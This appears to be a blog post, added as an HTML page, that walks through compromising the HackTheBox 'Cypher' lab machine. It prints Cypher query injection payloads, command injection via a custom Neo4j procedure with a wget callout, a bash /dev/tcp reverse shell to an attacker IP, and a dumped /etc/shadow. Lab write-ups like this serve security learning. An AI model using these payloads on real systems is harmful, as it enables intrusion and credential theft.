@@ -1,0 +1,532 @@
+<!doctype html>
+<html class="not-ready lg:text-base overflow-y-scroll scroll-pt-14" lang="en">
+
+<head prefix="og: https://ogp.me/ns# article: https://ogp.me/ns/article#">
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+  <meta name="generator" content="Zola v0.21.0" />
+  <title>HackTheBox Cypher Writeup | Dreamer</title>
+  <meta property="og:site_name" content="Dreamer" />
+  <meta property="og:title" content="HackTheBox Cypher Writeup" />
+  <meta name="description" content="This blog post details the process of exploiting the HackTheBox Cypher machine, focusing on a multi-stage attack. It covers initial enumeration, identifying a Cypher query injection vulnerability, and…" />
+  <meta property="og:description" content="This blog post details the process of exploiting the HackTheBox Cypher machine, focusing on a multi-stage attack. It covers initial enumeration, identifying a Cypher query injection vulnerability, and subsequently discovering a command injection within a custom Neo4j APOC extension. The writeup then…" />
+  <meta property="og:url" content="https://ismailbozkurt.github.io/blog/HackTheBox/htb-cypher/" />
+  <link rel="canonical" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-cypher/" />
+  <meta property="og:type" content="article" />
+  <meta property="article:published_time" content="2025-07-25T00:00:00+00:00" />
+  <meta property="og:image" content="https://ismailbozkurt.github.io/images/HackTheBox/HTB-Cypher/HTB-Cypher.png" />
+  <meta property="og:image:alt" content="This blog post details the process of exploiting the HackTheBox Cypher machine, focusing on a multi-stage attack. It covers initial enumeration, identifying a Cypher query injection vulnerability, and subsequently discovering a command injection within a custom Neo4j APOC extension. The writeup then explains how these vulnerabilities were chained to gain a reverse shell, ultimately leading to privilege escalation through a sudo misconfiguration involving the bbot tool." />
+  <meta property="og:image:width" content="300" />
+  <meta property="og:image:height" content="300" />
+  <meta property="og:image:type" content="image/png" />
+  <link rel="alternate" type="application/atom+xml" href="https://ismailbozkurt.github.io/atom.xml" title="Dreamer | Atom" />
+  <link rel="license" href="https://creativecommons.org/licenses/by-sa/4.0/deed" />
+  <!-- Begin Head inject -->
+  
+  <!-- End Head inject -->
+  <link rel="stylesheet" href="https://ismailbozkurt.github.io/main.min.css?h=2e89f7f30f1019877d14" />
+  <style>
+  :root{--bg: #f4f4f5; --header: #e4e4e7; color-scheme: light;}
+  :root.dark{--bg: #18181b; --header: #27272a; color-scheme: dark;}
+  </style>
+  <meta name="theme-color" data-light="#e4e4e7" data-dark="#27272a" content="#e4e4e7" />
+  <link rel="icon" type="image/x-icon" sizes="16x16" href="https://ismailbozkurt.github.io/favicon.ico" />
+  <link rel="apple-touch-icon" type="image/png" href="https://ismailbozkurt.github.io/apple-touch-icon.png?h=58bee300054c5308feb3" />
+  <link rel="icon" type="image/png" href="https://ismailbozkurt.github.io/android-icon.png?h=8d80ec95446bd2c36826" />
+  <script src="https://ismailbozkurt.github.io/js/linkita.min.js?h=1dd3ed42fc674277bc34"></script>
+  <script src="https://ismailbozkurt.github.io/js/linkita-search.min.js?h=698547b4b081d012c661"></script>
+  <!-- Begin Head End inject -->
+  <!-- Umami analytics -->
+<script defer src="https://cloud.umami.is/script.js" data-website-id="3da49f88-7825-49a6-b9cf-de0c7610e7dc"></script>
+
+<!-- Custom CSS -->
+<link rel="stylesheet" href="https://ismailbozkurt.github.io/files/custom.css">
+
+<!-- HEAD END -->
+
+  <!-- End Head End inject -->
+</head>
+
+<body class="text-black duration-100 ease-out bg-[var(--bg)] dark:text-white">
+  <!-- Header -->
+<header class="bg-[var(--header)] fixed top-0 z-40 mx-auto min-h-[3.25rem] w-full header-icons">
+  <div class="mx-auto w-full max-w-4xl p-2.5 lg:flex lg:justify-between">
+    <div class="flex justify-between">
+      <div class="flex items-center min-h-8">
+        <a title="Go to home page" accesskey="!"
+          href="https://ismailbozkurt.github.io/" class="text-2xl font-semibold">Dreamer</a>
+        <button type="button" title="Switch color scheme" accesskey="$"
+          onclick="window.linkita.toggleDarkMode();" ondblclick="window.linkita.resetDarkMode();"
+          class="btn-dark ml-4 h-6 w-6 shrink-0 cursor-pointer text-[0] bg-center bg-no-repeat bg-cover dark:invert [background-image:var(--icon-theme-dark)] dark:[background-image:var(--icon-theme-light)]"
+        ></button>
+        <button type="button" title="Search" accesskey="/"
+          onclick="window.linkita.toggleSearch();"
+          class="btn-search ml-4 h-6 w-6 shrink-0 cursor-pointer text-[0] bg-center bg-no-repeat bg-cover [background-image:var(--icon-search)] dark:invert"
+        ></button>
+        <script>window.linkita.initSearchButton({ scripts: ["https://ismailbozkurt.github.io/elasticlunr.min.js", "https://ismailbozkurt.github.io/search_index.en.js"] });</script>
+      </div>
+      <div title="Menu" role="button" accesskey="+" tabindex="0"
+        class="btn-menu relative z-50 flex h-8 w-8 shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden"
+        onclick="window.linkita.toggleHeaderMenu();"
+        onkeydown="(event.keyCode == 13 || event.keyCode == 32) ? event.preventDefault() || window.linkita.toggleHeaderMenu() : true;"
+      ></div>
+    </div>
+    <nav class="flex w-full items-center lg:w-auto">
+      <menu
+        class="nav-wrapper flex w-full flex-col py-2 lg:w-auto lg:flex-row lg:self-center lg:py-0">
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://ismailbozkurt.github.io/infosec_notes"
+          >Infosec-Notes</a>
+        </li>
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://ismailbozkurt.github.io/posts"
+          >Posts</a>
+        </li>
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://ismailbozkurt.github.io/about"
+          >About</a>
+        </li>
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://ismailbozkurt.github.io/n2myself"
+          >Note2Myself</a>
+        </li>
+      </menu>
+      <!-- Begin Header Nav inject -->
+      
+      <!-- End Header Nav inject -->
+    </nav>
+  </div>
+</header>
+
+  <!-- Begin Body Start inject -->
+  
+  <!-- End Body Start inject -->
+  <main class="prose prose-neutral relative mx-auto min-h-[calc(100%-4rem)]
+    max-w-3xl break-words px-4 pb-12 pt-28 lg:pt-32 dark:prose-invert prose-pre:rounded-lg prose-img:rounded-lg">
+      <!-- Search -->
+<div id="linkita-search-wrapper" class="hidden">
+  <ul id="linkita-search-results"></ul>
+</div>
+
+    
+<article>
+  <!-- Begin Page Start inject -->
+  
+  <!-- End Page Start inject -->
+
+  <header class="mb-16">
+    <h1 class="!my-0 pb-2.5">HackTheBox Cypher Writeup</h1>
+    <!-- Page Info -->
+<div class="text-sm antialiased opacity-80"><time
+      datetime="2025-07-25T00:00:00+00:00">2025-07-25</time><span
+        class="middot"></span><time
+    datetime="PT0H5M0S">5&nbsp;min</time><span
+      class="middot"></span>
+</div>
+
+  </header>
+  <figure class="mb-12 mt-0">
+    <img
+      class="h-auto w-full rounded-lg"
+      src="https://ismailbozkurt.github.io/images/HackTheBox/HTB-Cypher/HTB-Cypher.png"
+      alt="This blog post details the process of exploiting the HackTheBox Cypher machine, focusing on a multi-stage attack. It covers initial enumeration, identifying a Cypher query injection vulnerability, and subsequently discovering a command injection within a custom Neo4j APOC extension. The writeup then explains how these vulnerabilities were chained to gain a reverse shell, ultimately leading to privilege escalation through a sudo misconfiguration involving the bbot tool."
+      width="300"
+      height="300"
+    />
+  </figure>
+  <!-- TOC -->
+<div class="block-bg mb-12 rounded-lg p-2 text-lg">
+  <details>
+    <summary class="select-none py-0.5 lg:py-1 pl-4" accesskey="=">
+      <span class="cursor-pointer">Table of Contents</span>
+    </summary>
+    <div class="px-2">
+      <ul>
+        <li>
+          <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-cypher/#enumeration">Enumeration</a>
+          <ul>
+            <li>
+              <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-cypher/#nmap">Nmap</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-cypher/#http-enumeration">HTTP Enumeration</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-cypher/#directory-enumeration">Directory Enumeration</a>
+            </li>
+          </ul>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-cypher/#jar-file-analysis">Jar File Analysis</a>
+          <ul>
+            <li>
+              <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-cypher/#command-injection-vulnerability">Command Injection Vulnerability</a>
+            </li>
+          </ul>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-cypher/#cypher-query-injection">Cypher Query Injection</a>
+          <ul>
+            <li>
+              <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-cypher/#building-injection-query">Building injection query</a>
+            </li>
+          </ul>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-cypher/#command-injection-attack">Command Injection Attack</a>
+          <ul>
+            <li>
+              <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-cypher/#reverse-shell">Reverse Shell</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-cypher/#privilege-escalation">Privilege Escalation</a>
+            </li>
+          </ul>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-cypher/#shadow-file">Shadow File</a>
+        </li>
+      </ul>
+    </div>
+  </details>
+</div>
+
+  <!-- Content -->
+  <section><h2 id="enumeration">Enumeration</h2>
+<h3 id="nmap">Nmap</h3>
+<p>The nmap result shows the IP address as 10.10.11.57 and the hostname as cypher.htb</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">PORT</span><span>   STATE SERVICE REASON         VERSION
+</span><span style="color:#bf616a;">22/tcp</span><span> open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; </span><span style="color:#bf616a;">protocol</span><span> 2.0)
+</span><span>| </span><span style="color:#bf616a;">ssh-hostkey: 
+</span><span>|   </span><span style="color:#bf616a;">256</span><span> be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
+</span><span>| </span><span style="color:#bf616a;">ecdsa-sha2-nistp256</span><span> AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMurODrr5ER4wj9mB2tWhXcLIcrm4Bo1lIEufLYIEBVY4h4ZROFj2+WFnXlGNqLG6ZB+DWQHRgG/6wg71wcElxA=
+</span><span>|   </span><span style="color:#bf616a;">256</span><span> e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
+</span><span>|</span><span style="color:#bf616a;">_ssh-ed25519</span><span> AAAAC3NzaC1lZDI1NTE5AAAAIEqadcsjXAxI3uSmNBA8HUMR3L4lTaePj3o6vhgPuPTi
+</span><span style="color:#bf616a;">80/tcp</span><span> open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
+</span><span>| </span><span style="color:#bf616a;">http-methods: 
+</span><span>|</span><span style="color:#bf616a;">_</span><span>  Supported Methods: GET HEAD POST OPTIONS
+</span><span>|</span><span style="color:#bf616a;">_http-server-header:</span><span> nginx/1.24.0 (Ubuntu)
+</span><span>|</span><span style="color:#bf616a;">_http-title:</span><span> Did not follow redirect to http://cypher.htb/
+</span><span style="color:#bf616a;">Service</span><span> Info: OS: Linux; </span><span style="color:#bf616a;">CPE:</span><span> cpe:/o:linux:linux_kernel
+</span></code></pre>
+<p>Update <code>/etc/hosts</code> file</p>
+<p><code>10.10.11.57     cypher.htb</code></p>
+<h3 id="http-enumeration">HTTP Enumeration</h3>
+<p>When visiting the page, the Graph ASM keyword was highlighted. I searched for this term, and the results primarily concerned visualizing assembly code using various frameworks or scripts.</p>
+<p><img src="/images/HackTheBox/HTB-Cypher/ff3cc7301726087e21832534261222ac.png" alt="ff3cc7301726087e21832534261222ac.png" /></p>
+<p>The web service utilizes nginx/1.24.0 (Ubuntu). This can be confirmed through an Nmap scan or by consulting <a href="https://0xdf.gitlab.io/cheatsheets/404">0xdf's 404 Cheatsheet</a></p>
+<p><img src="/images/HackTheBox/HTB-Cypher/8a9e3364e39652fe2fc7f50f60e2e93c.png" alt="8a9e3364e39652fe2fc7f50f60e2e93c.png" /></p>
+<p>The web service has login functionality. Tried default credentials but no luck.</p>
+<p><img src="/images/HackTheBox/HTB-Cypher/8ab32ec131b77df07c9826d6219b8451.png" alt="8ab32ec131b77df07c9826d6219b8451.png" /></p>
+<p>When examining the page source of the login page, a JavaScript method was found, which included a comment that leaked the database type as Neo4j.</p>
+<p><img src="/images/HackTheBox/HTB-Cypher/fa1b8f4fc46e9eb458f204d856bd1b03.png" alt="fa1b8f4fc46e9eb458f204d856bd1b03.png" /></p>
+<p>The <code>doLogin</code> function verifies usernames and passwords through the <code>/api/auth/</code> endpoint. Notably, no sanitization is implemented within this function.</p>
+<h3 id="directory-enumeration">Directory Enumeration</h3>
+<p><code>ffuf -u http://cypher.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></p>
+<p><img src="/images/HackTheBox/HTB-Cypher/08eacea1ec56f408298860348b1d56ea.png" alt="08eacea1ec56f408298860348b1d56ea.png" /></p>
+<p>While enumerating directories, all endpoints were encountered except for the testing endpoint. This particular endpoint contains the <code>custom-apoc-extension-1.0-SNAPHOT.jar</code> file.</p>
+<p><img src="/images/HackTheBox/HTB-Cypher/71b9ccadd216a1ef00165b41a137fff2.png" alt="71b9ccadd216a1ef00165b41a137fff2.png" /></p>
+<h2 id="jar-file-analysis">Jar File Analysis</h2>
+<p>The JAR file was developed for Neo4j, with the database version identified as 5.23.0. The artifactId within the JAR file indicates custom-apoc-extension. ^jar-file</p>
+<p><img src="/images/HackTheBox/HTB-Cypher/1e340301a61a8461e60264d57d0357c2.png" alt="1e340301a61a8461e60264d57d0357c2.png" /></p>
+<blockquote>
+<p>What is APOC-Extension ?</p>
+<blockquote>
+<p>APOC, which stands for <strong>Awesome Procedures On Cypher</strong>, is a highly popular and powerful <strong>add-on library (or extension)</strong> for the Neo4j graph database. It significantly extends the capabilities of Cypher, Neo4j's query language, by providing hundreds of additional procedures and functions.</p>
+</blockquote>
+</blockquote>
+<h4 id="command-injection-vulnerability">Command Injection Vulnerability</h4>
+<p>When I examine <code>getUrlStatusCode</code> method inside of <code>com.cypher.neo4j.apoc</code> The method parsing URL and than making curl request via exec method. The argument of exec method is <code>url</code></p>
+<p>No sanitization made and directly passing into exec. It seems command injection vulnerability we have here. ^command-injection-vulnerability</p>
+<p><img src="/images/HackTheBox/HTB-Cypher/e72ccc82ac60605f2a154e1aa86f3d68.png" alt="e72ccc82ac60605f2a154e1aa86f3d68.png" /></p>
+<blockquote>
+<p>What do we have ?</p>
+<blockquote>
+<p>Neo4j Database with 5.23.0 version
+Command injection vulnerability in getUrlStatusCode method.
+No sanitization made username and password field in front-end. The webservice vulnerable cypher-query-injection ?</p>
+</blockquote>
+</blockquote>
+<p>At this point only question remains needs to an answer. Lets find out.</p>
+<h2 id="cypher-query-injection">Cypher Query Injection</h2>
+<p>Cypher injection is like any other known database (mysql, mssql, sqlite etc. etc.) injection. The only difference the query language different.</p>
+<p><strong>Payload:</strong> <code>test' //</code></p>
+<p><img src="/images/HackTheBox/HTB-Cypher/d30659162426a60cc329526ffa87f434.png" alt="d30659162426a60cc329526ffa87f434.png" /></p>
+<p>The application's logic resides in app.py, and the full Cypher query is revealed in error messages. For those unfamiliar with Cypher injection, here is a practical guide: <a href="https://hackmd.io/@Chivato/rkAN7Q9NY">article</a> about the cypher injection.</p>
+<p><strong>Full Query:</strong> MATCH (u:USER) -[:SECRET]-&gt; (h:SHA1) WHERE u.name = 'test'{PAYLOAD} //' return h.value as hash"</p>
+<h3 id="building-injection-query">Building injection query</h3>
+<p><strong>Injected Query:</strong> "test' OR 1=1 WITH 1 AS x CALL custom.getUrlStatusCode("http://10.10.14.13:8000/helloWorld") YIELD statusCode AS y RETURN y as hash //" ^trigger-custom-procedure-call</p>
+<p>Let's break down the query:</p>
+<p>' OR 1=1 WITH 1 AS x: This segment uses a simple logical operation as a filler and then assigns the value 1 to the variable x using a WITH clause.</p>
+<p>CALL custom.getUrlStatusCode("http://10.10.14.13:8000/helloWorld") YIELD statusCode: This invokes the custom.getUrlStatusCode procedure, which was discovered during the JAR file analysis. The query specifies YIELD statusCode, indicating that the output variable for the status code is named statusCode.</p>
+<p>AS y RETURN y AS hash: In this final part, the value yielded as statusCode is assigned to y, and then y is returned as hash.</p>
+<p><img src="/images/HackTheBox/HTB-Cypher/4ab7d62e5d2dfcde08c04951bcc9cf0c.png" alt="4ab7d62e5d2dfcde08c04951bcc9cf0c.png" /></p>
+<h2 id="command-injection-attack">Command Injection Attack</h2>
+<p>After executing the <a href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-cypher/#jar-file-analysis">getUrlStatusCode custom procedure call</a>.
+All we have to do is verifying the <a href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-cypher/#command-injection-vulnerability">command injection vulnerability</a></p>
+<p>The screenshot below is verifying the command injection works as expected.</p>
+<p>The payload: <strong>test' OR 1=1 WITH 1 AS x CALL custom.getUrlStatusCode("http://10.10.14.13:8000/helloWorld;wget http://10.10.14.13:8000/commandinjected") YIELD statusCode AS y RETURN y as hash //</strong></p>
+<p><img src="/images/HackTheBox/HTB-Cypher/aff64090b7083bd455c76d3202bdd9f7.png" alt="aff64090b7083bd455c76d3202bdd9f7.png" /></p>
+<h3 id="reverse-shell">Reverse Shell</h3>
+<p>Payload: <strong>test' OR 1=1 WITH 1 AS x CALL custom.getUrlStatusCode("http://10.10.14.13:8000/helloWorld;bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.13/8443 0&gt;&amp;1'") YIELD statusCode AS y RETURN y as hash //</strong></p>
+<p><img src="/images/HackTheBox/HTB-Cypher/6bd4a0372389d3566fc151c65b101159.png" alt="6bd4a0372389d3566fc151c65b101159.png" /></p>
+<p>Switching full tty shell</p>
+<p><img src="/images/HackTheBox/HTB-Cypher/ead795ec488b292280f019798b670d29.png" alt="ead795ec488b292280f019798b670d29.png" /></p>
+<p>Generally in HTB environment <code>.bash_history</code> is linked to <code>/dev/null</code> When i look the neo4j user home directory the <code>.bash_history</code> is not empty and didn't linked to <code>/dev/null</code></p>
+<p><img src="/images/HackTheBox/HTB-Cypher/5cf125974064afab9a8c3b28ddacc46d.png" alt="5cf125974064afab9a8c3b28ddacc46d.png" /></p>
+<p>The password in <code>.bash_history</code> is the password of <code>graphasm</code> user. Found by spraying the password for the users.</p>
+<p><img src="/images/HackTheBox/HTB-Cypher/e828f01b331995cc9e22162504a4948b.png" alt="e828f01b331995cc9e22162504a4948b.png" /></p>
+<p>When I gained access as a user on the system, I typically execute <code>sudo -l</code> in a Linux environment or <code>whoami /priv</code> in a Windows environment to check for privilege escalation opportunities.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">graphasm@cypher:~$</span><span> sudo</span><span style="color:#bf616a;"> -l
+</span><span style="color:#bf616a;">Matching</span><span> Defaults entries for graphasm on cypher:
+</span><span>    </span><span style="color:#bf616a;">env_reset,</span><span> mail_badpass, secure_path=/usr/local/sbin</span><span style="color:#96b5b4;">\:</span><span>/usr/local/bin</span><span style="color:#96b5b4;">\:</span><span>/usr/sbin</span><span style="color:#96b5b4;">\:</span><span>/usr/bin</span><span style="color:#96b5b4;">\:</span><span>/sbin</span><span style="color:#96b5b4;">\:</span><span>/bin</span><span style="color:#96b5b4;">\:</span><span>/snap/bin, use_pty
+</span><span>
+</span><span style="color:#bf616a;">User</span><span> graphasm may run the following commands on cypher:
+</span><span>    (</span><span style="color:#bf616a;">ALL</span><span>) NOPASSWD: /usr/local/bin/bbot
+</span><span style="color:#bf616a;">graphasm@cypher:~$ 
+</span></code></pre>
+<p>When i executed the binary detailed help menu displayed.</p>
+<p><img src="/images/HackTheBox/HTB-Cypher/bfc87d63e5686732eebe447cfb0ec66e.png" alt="bfc87d63e5686732eebe447cfb0ec66e.png" /></p>
+<p>When I list the modules, find out reference link for the binary.</p>
+<p><a href="https://www.blacklanternsecurity.com/bbot/Stable">https://www.blacklanternsecurity.com/bbot/Stable</a></p>
+<p><img src="/images/HackTheBox/HTB-Cypher/2a37debbdad96087d20933b0eb4cc0ce.png" alt="2a37debbdad96087d20933b0eb4cc0ce.png" /></p>
+<p>BBOT is osint tool for multipurpose usage (enumeration, vulnerability scanning etc. etc.). Seems like every bugbounty hunter should've in toolset. Looks promising tool.</p>
+<p><img src="/images/HackTheBox/HTB-Cypher/1dac47de467313826fd568b4655c58be.png" alt="1dac47de467313826fd568b4655c58be.png" /></p>
+<p>After some googling stuff and github digging <code>label:bug</code> in repository.</p>
+<p>Encountered <a href="https://seclists.org/fulldisclosure/2025/Apr/19">https://seclists.org/fulldisclosure/2025/Apr/19</a> vulnerability.</p>
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+<p><a href="https://github.com/Housma/bbot-privesc">https://github.com/Housma/bbot-privesc</a></p>
+<p>Following PoC steps lead to root privileges in the box.</p>
+<p><img src="/images/HackTheBox/HTB-Cypher/7c7cc03e56b81e330368f012e41accbc.png" alt="7c7cc03e56b81e330368f012e41accbc.png" /></p>
+<h2 id="shadow-file">Shadow File</h2>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">uid</span><span>=</span><span style="color:#a3be8c;">0</span><span>(</span><span style="color:#bf616a;">root</span><span>) gid=0(root) </span><span style="color:#bf616a;">groups</span><span>=</span><span style="color:#a3be8c;">0</span><span>(</span><span style="color:#bf616a;">root</span><span>)
+</span><span style="color:#bf616a;">root@cypher:/dev/shm#</span><span> cat /root/root.txt
+</span><span style="color:#bf616a;">656453da00441f4e2707a91535d6e5b3
+</span><span style="color:#bf616a;">root@cypher:/dev/shm#</span><span> cat /etc/shadow
+</span><span style="color:#bf616a;">root:</span><span>$</span><span style="color:#bf616a;">y</span><span>$</span><span style="color:#bf616a;">j9T</span><span>$</span><span style="color:#bf616a;">ianAmmc1w6VSodw.1fzgk/</span><span>$</span><span style="color:#bf616a;">3DenO5YJ1VBvE1VekRL79v6bN00fhcbA59zeeLciY67:20133:0:99999:7:::
+</span><span style="color:#bf616a;">daemon:*:19962:0:99999:7:::
+</span><span style="color:#bf616a;">bin:*:19962:0:99999:7:::
+</span><span style="color:#bf616a;">sys:*:19962:0:99999:7:::
+</span><span style="color:#bf616a;">sync:*:19962:0:99999:7:::
+</span><span style="color:#bf616a;">games:*:19962:0:99999:7:::
+</span><span style="color:#bf616a;">man:*:19962:0:99999:7:::
+</span><span style="color:#bf616a;">lp:*:19962:0:99999:7:::
+</span><span style="color:#bf616a;">mail:*:19962:0:99999:7:::
+</span><span style="color:#bf616a;">news:*:19962:0:99999:7:::
+</span><span style="color:#bf616a;">uucp:*:19962:0:99999:7:::
+</span><span style="color:#bf616a;">proxy:*:19962:0:99999:7:::
+</span><span style="color:#bf616a;">www-data:*:19962:0:99999:7:::
+</span><span style="color:#bf616a;">backup:*:19962:0:99999:7:::
+</span><span style="color:#bf616a;">list:*:19962:0:99999:7:::
+</span><span style="color:#bf616a;">irc:*:19962:0:99999:7:::
+</span><span style="color:#bf616a;">_apt:*:19962:0:99999:7:::
+</span><span style="color:#bf616a;">nobody:*:19962:0:99999:7:::
+</span><span style="color:#bf616a;">systemd-network:!*:19962::::::
+</span><span style="color:#bf616a;">systemd-timesync:!*:19962::::::
+</span><span style="color:#bf616a;">dhcpcd:!:19962::::::
+</span><span style="color:#bf616a;">messagebus:!:19962::::::
+</span><span style="color:#bf616a;">systemd-resolve:!*:19962::::::
+</span><span style="color:#bf616a;">pollinate:!:19962::::::
+</span><span style="color:#bf616a;">polkitd:!*:19962::::::
+</span><span style="color:#bf616a;">syslog:!:19962::::::
+</span><span style="color:#bf616a;">uuidd:!:19962::::::
+</span><span style="color:#bf616a;">tcpdump:!:19962::::::
+</span><span style="color:#bf616a;">tss:!:19962::::::
+</span><span style="color:#bf616a;">landscape:!:19962::::::
+</span><span style="color:#bf616a;">fwupd-refresh:!*:19962::::::
+</span><span style="color:#bf616a;">usbmux:!:20004::::::
+</span><span style="color:#bf616a;">sshd:!:20004::::::
+</span><span style="color:#bf616a;">graphasm:</span><span>$</span><span style="color:#bf616a;">y</span><span>$</span><span style="color:#bf616a;">j9T</span><span>$</span><span style="color:#bf616a;">lDLyqZAxCXhX1EB3v01Zl.</span><span>$</span><span style="color:#bf616a;">C0XwosQvBM.5sAPbHd8oyAK0e8lg0GX5YJHb7qImQV7:20004:0:99999:7:::
+</span><span style="color:#bf616a;">neo4j:!:20004::::::
+</span><span style="color:#bf616a;">_laurel:!:20136::::::
+</span></code></pre>
+</section>
+  <hr />
+  <!-- Post Taxonomies -->
+
+  <!-- Post Nav -->
+<nav class="block-bg mt-12 flex flex-wrap rounded-lg text-lg">
+  <a
+    class="block-hover-mask flex min-w-[50%] grow items-center rounded-l-md p-6 pr-3 font-semibold no-underline"
+    href="https://ismailbozkurt.github.io/blog/SmileyCTF/smileyctf-babyrop2/" accesskey=","
+    ><span class="mr-1.5">&#8249;</span><span>SmileyCTF Babyrop Writeup 2</span></a>
+  <a
+    class="block-hover-mask ml-auto flex min-w-[50%] grow items-center justify-end rounded-r-md p-6 pl-3 font-semibold no-underline"
+    href="https://ismailbozkurt.github.io/blog/SmileyCTF/smileyctf-babyrop3/" accesskey="."
+    ><span>SmileyCTF babyrop Writeup 3</span><span class="ml-1.5">&#8250;</span></a>
+</nav>
+
+  <!-- Begin Page End inject -->
+  
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script>
+<script>
+  mediumZoom('img:not(.no-zoom)', {
+    margin: 24,
+    background: 'rgba(0, 0, 0, 0.9)',
+    scrollOffset: 40,
+  });
+</script>
+<!-- Only runs if .encrypted-content exists -->
+<script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    function showDecryptionUI(block) {
+      block.innerHTML = `<div style="padding: 1rem; border: 1px solid #444; border-radius: 8px; background: #1e1e1e;">
+  <label style="display:block; margin-bottom:0.8rem; font-weight:600; font-size:1.1rem; color:#f5f5f5;">
+    🔒 This content is password-protected:
+  </label>
+  <div style="display: flex; align-items: center; gap: 0.75rem;">
+    <input type="password" id="decrypt-password" placeholder="Enter password"
+           style="flex: 1; padding: 0.6rem 0.8rem; font-size: 1rem; background: #2a2a2a; color: #eee; border: 1px solid #555; border-radius: 4px;">
+    <button id="decrypt-button"
+            style="padding: 0.6rem 1rem; background: #2d2d2d; color: white; border: none; border-radius: 4px; font-weight: 600; cursor: pointer;">
+      Decrypt
+    </button>
+    <div style="display: flex; align-items: center;">
+      <input type="checkbox" id="show-pw" style="margin-left: 0.4rem; cursor: pointer;">
+      <label for="show-pw" title="Show password" style="margin-left: 0.4rem; font-size: 1.2rem; cursor: pointer;">👁️</label>
+    </div>
+  </div>
+  <div id="decrypt-error" style="color: #ff6b6b; margin-top: 0.75rem;"></div>
+</div>
+`;
+      var input = block.querySelector('input[type="password"]');
+      var button = block.querySelector('button');
+      var error = block.querySelector('#decrypt-error');
+      var showPw = block.querySelector('#show-pw');
+      showPw.onchange = function () {
+        input.type = this.checked ? 'text' : 'password';
+      };
+      button.onclick = function () {
+        var password = input.value;
+        var ciphertext_b64 = block.getAttribute('data-encrypted');
+        try {
+          var ciphertext = CryptoJS.enc.Base64.parse(ciphertext_b64);
+          var iv = CryptoJS.lib.WordArray.create(ciphertext.words.slice(0, 4), 16);
+          var actualCiphertext = CryptoJS.lib.WordArray.create(ciphertext.words.slice(4), ciphertext.sigBytes - 16);
+          var key = CryptoJS.SHA256(password);
+          var bytes = CryptoJS.AES.decrypt({ ciphertext: actualCiphertext }, key, { iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7 });
+          var plaintext = bytes.toString(CryptoJS.enc.Utf8);
+          if (!plaintext) throw new Error('Incorrect password or corrupt data');
+
+          plaintext = plaintext.replace(/!\[\[(.*?)\]\]/g, (match, p1) => {
+            const src = p1.match(/^\//) ? p1 : '/assets/images/' + p1;
+            return `![](${src})`;
+          });
+          plaintext = plaintext.replace(/\[\[(.*?)\]\]/g, (match, p1) => {
+            const href = '/' + p1.trim().replace(/\s+/g, '-').toLowerCase();
+            return `[${p1}](${href})`;
+          });
+          plaintext = plaintext.replace(/!\[\]\((data:image\/[^)]+)\)/g, (match, dataUri) => {
+            return `<img src="${dataUri}" style="max-width:100%; border-radius:8px; margin:1rem 0;">`;
+          });
+
+          if (window.marked) {
+            block.innerHTML = '<div class="post-content">' + marked.parse(plaintext) + '</div>';
+          } else {
+            block.innerHTML = '<pre>' + plaintext + '</pre>';
+            return;
+          }
+          
+          mediumZoom('img:not(.no-zoom)', {
+          margin: 24,
+          background: 'rgba(0, 0, 0, 0.9)',
